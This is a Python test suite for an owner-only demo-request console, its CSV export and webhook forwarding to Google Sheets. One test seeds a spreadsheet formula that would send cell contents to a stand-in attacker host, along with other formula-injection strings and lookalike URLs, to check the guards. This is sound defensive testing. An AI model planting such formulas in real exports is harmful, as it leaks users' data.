"""
Tests for the owner console's Demo Requests view and the optional Google
Sheet forwarding of new Book a Demo submissions:

  - GET /owner/demo-requests and /owner/demo-requests/export.csv are
    owner-only (404 for a non-owner admin, 401 logged out) -- these are
    Abstractly's own sales leads, never a customer firm's admin's.
  - Newest-first ordering, CSV content, and the CSV formula-injection
    guard (the cells come from a public form).
  - app/demo_request_sheet.py: off when unset, Apps-Script-only URL,
    secret in the body, never raises, 302 == delivered.
  - POST /demo-request forwards real submissions, not honeypot ones, and
    still returns 201 when forwarding blows up.

Every outbound call is mocked: requests.post for the webhook, and
smtplib.SMTP_SSL via the stripped EMAIL_* env (same as test_demo_request.py).
"""

import csv
import io
import os
import sys
import tempfile
import unittest.mock as mock

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.api import app
from app import api as api_module
from app import database, demo_request_sheet
from app.auth import hash_password
from _session_users import sync_session_user

os.environ.pop("EMAIL_USER", None)
os.environ.pop("EMAIL_APP_PASSWORD", None)
os.environ.pop(demo_request_sheet.WEBHOOK_URL_ENV, None)
os.environ.pop(demo_request_sheet.SECRET_ENV, None)

HOOK = "https://script.google.com/macros/s/AKfycbTESTDEPLOYMENTID/exec"

_VALID_BODY = {
    "name": "Jane Doe",
    "work_email": "jane@example.com",
    "company": "Example Capital Partners",
    "units": 240,
    "message": "Underwriting a 240-unit deal.",
}


def _fresh_temp_db():
    real_admin_email = os.environ.pop("ADMIN_EMAIL", None)
    real_admin_hash = os.environ.pop("ADMIN_PASSWORD_HASH", None)
    try:
        tmp = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        tmp.close()
        database.configure(tmp.name)
        database.init_db()
    finally:
        if real_admin_email is not None:
            os.environ["ADMIN_EMAIL"] = real_admin_email
        if real_admin_hash is not None:
            os.environ["ADMIN_PASSWORD_HASH"] = real_admin_hash
    api_module._demo_request_rate_limiter.reset()
    return tmp.name


def _client_as(email, role, is_owner):
    user = database.create_user(email, "Test User", hash_password("password123"), role=role)
    client = app.test_client()
    with client.session_transaction() as sess:
        sess.update({"user_id": user["id"], "team_id": 1, "email": email, "name": "Test User",
                     "role": role, "is_owner": is_owner})
        sync_session_user(sess)
    return client


def _seed(rows):
    """Insert rows with explicit timestamps so ordering is deterministic."""
    conn = database.get_connection()
    try:
        for name, created_at, message in rows:
            conn.execute(
                "INSERT INTO demo_requests (name, work_email, company, units, message, created_at)"
                " VALUES (?, ?, ?, ?, ?, ?)",
                (name, f"{name.split()[0].lower()}@example.com", f"{name} Capital", 120, message, created_at),
            )
        conn.commit()
    finally:
        conn.close()


class _Resp:
    def __init__(self, status):
        self.status_code = status


# ------------------------------------------------------------------ access

def test_routes_are_owner_only():
    db = _fresh_temp_db()
    try:
        anon = app.test_client()
        for path in ("/owner/demo-requests", "/owner/demo-requests/export.csv"):
            assert anon.get(path).status_code == 401, path
        admin = _client_as("admin@example.com", "admin", is_owner=False)
        for path in ("/owner/demo-requests", "/owner/demo-requests/export.csv"):
            resp = admin.get(path)
            assert resp.status_code == 404, (path, resp.status_code)  # a customer admin must not even learn it exists
        owner = _client_as("owner@example.com", "admin", is_owner=True)
        for path in ("/owner/demo-requests", "/owner/demo-requests/export.csv"):
            assert owner.get(path).status_code == 200, path
    finally:
        os.unlink(db)
    print("✓ test_routes_are_owner_only: PASS")


# ------------------------------------------------------------- list + CSV

def test_list_is_newest_first_with_all_fields():
    db = _fresh_temp_db()
    try:
        _seed([
            ("Ann Older", "2026-09-01T10:00:00+00:00", "first"),
            ("Bea Newest", "2026-10-02T09:00:00+00:00", None),
            ("Cal Middle", "2026-09-15T12:00:00+00:00", "middle"),
            ("Dee Tie", "2026-10-02T09:00:00+00:00", "same instant, inserted later"),
        ])
        owner = _client_as("owner@example.com", "admin", is_owner=True)
        rows = owner.get("/owner/demo-requests").get_json()
        assert [r["name"] for r in rows] == ["Dee Tie", "Bea Newest", "Cal Middle", "Ann Older"]
        first = rows[0]
        for key in ("name", "work_email", "company", "units", "message", "created_at"):
            assert key in first, key
        assert first["work_email"] == "dee@example.com" and first["units"] == 120
    finally:
        os.unlink(db)
    print("✓ test_list_is_newest_first_with_all_fields: PASS")


def test_csv_export_content_and_formula_guard():
    db = _fresh_temp_db()
    try:
        _seed([
            ("Ann Older", "2026-09-01T10:00:00+00:00", "Plain message, with a comma\nand a newline"),
            ("Bob Newer", "2026-09-02T10:00:00+00:00", '=HYPERLINK("https://evil.example/?"&A1,"click")'),
        ])
        conn = database.get_connection()
        conn.execute("UPDATE demo_requests SET company = '@SUM(1+1)' WHERE name = 'Bob Newer'")
        conn.execute("UPDATE demo_requests SET name = '-2+3' WHERE name = 'Ann Older'")
        conn.commit()
        conn.close()

        owner = _client_as("owner@example.com", "admin", is_owner=True)
        resp = owner.get("/owner/demo-requests/export.csv")
        assert resp.status_code == 200
        assert resp.mimetype == "text/csv"
        assert "attachment" in resp.headers["Content-Disposition"]
        assert "demo-requests.csv" in resp.headers["Content-Disposition"]

        rows = list(csv.reader(io.StringIO(resp.get_data(as_text=True))))
        assert rows[0] == ["Date (UTC)", "Name", "Email", "Company", "Units", "Message"]
        assert len(rows) == 3
        bob, ann = rows[1], rows[2]  # newest first
        assert bob[0] == "2026-09-02T10:00:00+00:00"
        assert bob[5].startswith("'=HYPERLINK(")      # formula neutralized
        assert bob[3] == "'@SUM(1+1)"
        assert ann[1] == "'-2+3"
        assert ann[5] == "Plain message, with a comma\nand a newline"  # quoting survives round-trip
        assert ann[4] == "120"
    finally:
        os.unlink(db)
    print("✓ test_csv_export_content_and_formula_guard: PASS")


def test_csv_safe_helper():
    f = api_module._csv_safe
    assert f(None) == "" and f("") == "" and f(240) == "240"
    for bad in ("=1+1", "+1", "-1", "@x", "\tx", "\rx"):
        assert f(bad) == "'" + bad, bad
    assert f("Jane Doe") == "Jane Doe" and f("a=b") == "a=b"
    print("✓ test_csv_safe_helper: PASS")


def test_empty_list():
    db = _fresh_temp_db()
    try:
        owner = _client_as("owner@example.com", "admin", is_owner=True)
        assert owner.get("/owner/demo-requests").get_json() == []
        rows = list(csv.reader(io.StringIO(owner.get("/owner/demo-requests/export.csv").get_data(as_text=True))))
        assert len(rows) == 1  # header only
    finally:
        os.unlink(db)
    print("✓ test_empty_list: PASS")


# ------------------------------------------------------- sheet forwarding

_RECORD = {"id": 7, "name": "Jane Doe", "work_email": "jane@example.com", "company": "Example",
           "units": 240, "message": "hi", "created_at": "2026-10-05T12:00:00+00:00", "extra": "dropped"}


def test_forward_off_when_unset():
    with mock.patch.dict(os.environ, {}, clear=False):
        os.environ.pop(demo_request_sheet.WEBHOOK_URL_ENV, None)
        with mock.patch("requests.post") as post, mock.patch("threading.Thread") as thread:
            assert demo_request_sheet.forward(_RECORD) is False
            demo_request_sheet.forward_in_background(_RECORD)
            post.assert_not_called()
            thread.assert_not_called()
    print("✓ test_forward_off_when_unset: PASS")


def test_forward_refuses_non_apps_script_urls():
    for url in (
        "http://script.google.com/macros/s/X/exec",
        "https://evil.example/macros/s/X/exec",
        "https://script.google.com.evil.example/macros/s/X/exec",
        "https://script.google.com/macros/s/X/dev",
        "https://docs.google.com/spreadsheets/d/X",
    ):
        assert not demo_request_sheet.is_allowed_url(url), url
        with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: url}):
            with mock.patch("requests.post") as post:
                assert demo_request_sheet.forward(_RECORD) is False
                post.assert_not_called()
    assert demo_request_sheet.is_allowed_url(HOOK)
    print("✓ test_forward_refuses_non_apps_script_urls: PASS")


def test_forward_posts_payload_and_secret():
    env = {demo_request_sheet.WEBHOOK_URL_ENV: HOOK, demo_request_sheet.SECRET_ENV: "s3cret-value"}
    with mock.patch.dict(os.environ, env):
        for status, delivered in ((302, True), (200, True), (500, False), (403, False)):
            with mock.patch("requests.post", return_value=_Resp(status)) as post:
                assert demo_request_sheet.forward(_RECORD) is delivered, status
                args, kwargs = post.call_args
                assert args[0] == HOOK
                assert kwargs["allow_redirects"] is False and kwargs["timeout"] > 0
                payload = kwargs["json"]
                assert payload["secret"] == "s3cret-value"
                assert payload["work_email"] == "jane@example.com" and payload["units"] == 240
                assert "extra" not in payload
    with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
        os.environ.pop(demo_request_sheet.SECRET_ENV, None)
        with mock.patch("requests.post", return_value=_Resp(302)) as post:
            demo_request_sheet.forward(_RECORD)
            assert "secret" not in post.call_args[1]["json"]
    print("✓ test_forward_posts_payload_and_secret: PASS")


def test_forward_swallows_network_errors():
    import requests

    with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
        for exc in (requests.ConnectionError("down"), requests.Timeout("slow"), RuntimeError("bug")):
            with mock.patch("requests.post", side_effect=exc):
                assert demo_request_sheet.forward(_RECORD) is False
    print("✓ test_forward_swallows_network_errors: PASS")


def test_forward_in_background_uses_daemon_thread():
    with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
        with mock.patch("threading.Thread") as thread:
            demo_request_sheet.forward_in_background(_RECORD)
            kwargs = thread.call_args[1]
            assert kwargs["target"] is demo_request_sheet._forward_and_release and kwargs["daemon"] is True
            assert kwargs["args"][0] == _RECORD and kwargs["args"][0] is not _RECORD  # copied
            thread.return_value.start.assert_called_once()
    # The mocked thread never ran, so give back the slot it took.
    demo_request_sheet._in_flight.release()
    print("✓ test_forward_in_background_uses_daemon_thread: PASS")


def test_forward_in_background_caps_in_flight():
    """Security-audit follow-up: a burst can't pile up unbounded 10s threads."""
    cap = demo_request_sheet.MAX_IN_FLIGHT
    with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
        with mock.patch("threading.Thread") as thread:  # threads never run, so slots stay taken
            for _ in range(cap + 3):
                demo_request_sheet.forward_in_background(_RECORD)
            assert thread.call_count == cap, thread.call_count
        for _ in range(cap):
            demo_request_sheet._in_flight.release()
        # A finished forward frees its slot, even when forward() fails.
        with mock.patch("requests.post", side_effect=RuntimeError("down")):
            for _ in range(cap + 3):
                assert demo_request_sheet._in_flight.acquire(blocking=False)
                demo_request_sheet._forward_and_release(_RECORD)
    print("✓ test_forward_in_background_caps_in_flight: PASS")


# ------------------------------------------------ POST /demo-request wiring

def _post_demo(body):
    return app.test_client().post("/demo-request", json=body)


def test_submission_is_forwarded_with_saved_record():
    db = _fresh_temp_db()
    try:
        with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
            with mock.patch.object(demo_request_sheet, "forward_in_background") as fwd:
                resp = _post_demo(_VALID_BODY)
        assert resp.status_code == 201, resp.get_json()
        fwd.assert_called_once()
        record = fwd.call_args[0][0]
        saved = database.get_all_demo_requests()[0]
        assert record["id"] == saved["id"] and record["created_at"] == saved["created_at"]
        assert record["company"] == "Example Capital Partners"
    finally:
        os.unlink(db)
    print("✓ test_submission_is_forwarded_with_saved_record: PASS")


def test_forwarding_end_to_end_through_mocked_post():
    """Real thread, mocked network: the record actually reaches requests.post."""
    db = _fresh_temp_db()
    try:
        started = []

        class _InlineThread:
            def __init__(self, target, args, **kwargs):
                self.target, self.args = target, args

            def start(self):
                started.append(True)
                self.target(*self.args)

        with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
            with mock.patch("threading.Thread", _InlineThread), \
                    mock.patch("requests.post", return_value=_Resp(302)) as post:
                assert _post_demo(_VALID_BODY).status_code == 201
        assert started == [True]
        assert post.call_args[1]["json"]["name"] == "Jane Doe"
    finally:
        os.unlink(db)
    print("✓ test_forwarding_end_to_end_through_mocked_post: PASS")


def test_no_forward_when_unset_or_honeypot():
    db = _fresh_temp_db()
    try:
        os.environ.pop(demo_request_sheet.WEBHOOK_URL_ENV, None)
        with mock.patch.object(demo_request_sheet, "forward_in_background") as fwd:
            assert _post_demo(_VALID_BODY).status_code == 201
        fwd.assert_not_called()  # off: not even a DB re-read

        with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
            with mock.patch.object(demo_request_sheet, "forward_in_background") as fwd:
                assert _post_demo({**_VALID_BODY, "website": "spam.example"}).status_code == 201
        fwd.assert_not_called()
    finally:
        os.unlink(db)
    print("✓ test_no_forward_when_unset_or_honeypot: PASS")


def test_forwarding_crash_never_breaks_submission():
    db = _fresh_temp_db()
    try:
        with mock.patch.dict(os.environ, {demo_request_sheet.WEBHOOK_URL_ENV: HOOK}):
            with mock.patch.object(demo_request_sheet, "forward_in_background", side_effect=RuntimeError("boom")):
                resp = _post_demo(_VALID_BODY)
        assert resp.status_code == 201, resp.get_json()
        assert len(database.get_all_demo_requests()) == 1
    finally:
        os.unlink(db)
    print("✓ test_forwarding_crash_never_breaks_submission: PASS")


if __name__ == "__main__":
    test_routes_are_owner_only()
    test_list_is_newest_first_with_all_fields()
    test_csv_export_content_and_formula_guard()
    test_csv_safe_helper()
    test_empty_list()
    test_forward_off_when_unset()
    test_forward_refuses_non_apps_script_urls()
    test_forward_posts_payload_and_secret()
    test_forward_swallows_network_errors()
    test_forward_in_background_uses_daemon_thread()
    test_forward_in_background_caps_in_flight()
    test_submission_is_forwarded_with_saved_record()
    test_forwarding_end_to_end_through_mocked_post()
    test_no_forward_when_unset_or_honeypot()
    test_forwarding_crash_never_breaks_submission()
    print("\nAll demo requests view tests passed.")
